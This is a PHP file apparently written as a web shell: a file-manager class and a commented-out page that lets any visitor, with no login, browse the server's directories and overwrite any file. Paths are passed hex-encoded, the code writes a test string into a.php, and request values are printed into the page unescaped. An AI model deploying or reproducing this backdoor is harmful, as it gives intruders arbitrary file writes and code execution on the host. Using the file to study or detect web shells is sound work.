<?php
class Files {
	public $path;
  	public $array;
  	public $resource;
  	public $modes = [
  		'readonly' 			=> "r",
  		'readwrite' 		=> "r+",
  		'writeonly' 		=> "w",
  		'writemaster' 		=> "w+",
  		'writeappend' 		=> "a",
  		'readwriteappend' 	=> "a+"
  	];

  	function __construct($path) {
    	$this->path = $path;
  	}
  	public function get_path() {
    	return $this->path;
  	}
  	public function scdir() {
  		return scandir($this->get_path());
  	}
  	public static function cd($directory) {
  		return @chdir($directory);
  	}
  	public function ListFile($type) {
  		$this->array = [];
  		foreach ($this->scdir() as $key => $value) {
  			$filename['names'] = $this->get_path() . DIRECTORY_SEPARATOR . $value;
  			switch ($type) {
  				case 'dir':
  					if (!is_dir($filename['names']) || $value === '.' || $value === '..') continue 2;
  					break;
  				case 'file':
  					if (!is_file($filename['names'])) continue 2;
  					break;
  			}
  			$filename['fname'] = basename($filename['names']);
  			$this->array[] = $filename;
  		} return $this->array;
  	}
  	public function open($filename, $mode) {
        if (!empty(trim($filename))) {
            $this->resource = fopen($filename, $this->modes[$mode]);
            return $this;
        }
    }
    public function write($data) {
    	return (!empty($data)) ? fwrite($this->resource, $data) : false;
    }
    public function read($filename) {
    	return htmlspecialchars(file_get_contents($filename));
    }
    public static function hex($string) {
    	$str = "";
    	for ($i=0; $i < strlen($string); $i++) { 
    		$str .= dechex(ord($string[$i]));
    	} return $str;
    }
    public static function unhex($hex) {
    	$unhex = "";
    	for ($i=0; $i < strlen($hex)-1; $i+=2) { 
    		$unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
    	} return $unhex;
	}
}
/*
if (isset($_GET['cd'])) {
	Files::cd(Files::unhex($_GET['cd']));
}
$Files = new Files(getcwd());

print($Files->open("a.php", "writeonly")->write('santuuy'));

@$_POST['file'] = $Files->unhex($_POST['file']);
?>
<table>
	<?php
	switch (@$_POST['action']) {
		case 'edit':
			if (isset($_POST['submit'])) {
				$Files->open($_POST['file'], "writeonly")->write($_POST['data']);
			}
			?>
			<tr>
				<td>Filename : <?= basename($_POST['file']) ?></td>
			</tr>
			<form method="post">
				<tr>
					<td>
						<textarea name="data" rows="30" cols="100"><?= $Files->read($_POST['file']) ?></textarea>
					</td>
				</tr>
				<tr>
					<td>
						<input type="submit" name="submit">
						<input type="hidden" name="<?= $_POST['file'] ?>">
						<input type="hidden" name="action" value="edit">
					</td>
				</tr>
			</form>
			<?php
			exit();
			break;
	}
	print("<a href='?cd=".$Files->hex(dirname($Files->get_path()))."'>back</a>");
	foreach ($Files->ListFile("dir") as $key => $value) { ?>
		<tr>
			<td>
				<a href="?cd=<?= $Files->hex($value['names']) ?>"><?= $value['fname'] ?></a>
			</td>
			<td></td>
		</tr>
	<?php }
	foreach ($Files->ListFile("file") as $key => $value) { ?>
		<tr>
			<td><?= $value['fname'] ?></td>
			<form method="post">
				<td>
					<button name="action" value="edit">edit</button>
					<input type="hidden" name="file" value="<?= $Files->hex($value['names']) ?>">
				</td>
			</form>
		</tr>
	<?php }
	?>
</table>*/
